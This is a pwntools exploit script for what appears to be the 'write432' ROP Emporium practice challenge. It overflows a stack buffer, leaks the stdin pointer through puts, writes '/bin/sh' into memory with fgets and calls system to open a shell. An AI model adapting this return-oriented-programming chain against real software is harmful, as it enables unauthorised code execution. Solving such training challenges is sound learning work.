#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write432')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = (
    b"A" * 44 +
    p32(exe.plt["puts"]) +
    p32(exe.functions["main"].address) +
    p32(exe.got["stdin"])
)
io.sendline(payload)
data = io.recvline()
stdin = u32(data[:4])

log.info("Stdin leak: 0x%x", stdin)

pop3ret = 0x080486d9 # : pop esi ; pop edi ; pop ebp ; ret
mem_addr = 0x0804a028
binsh = "/bin/sh\n"
payload = (
    b"A" * 44 +
    p32(exe.plt["fgets"]) +
    p32(pop3ret) +
    p32(mem_addr) +
    p32(len(binsh)) +
    p32(stdin) +

    p32(exe.plt["system"]) +
    b"BBBB" +
    p32(mem_addr)
)
io.sendline(payload)
io.sendline(binsh)

io.interactive()

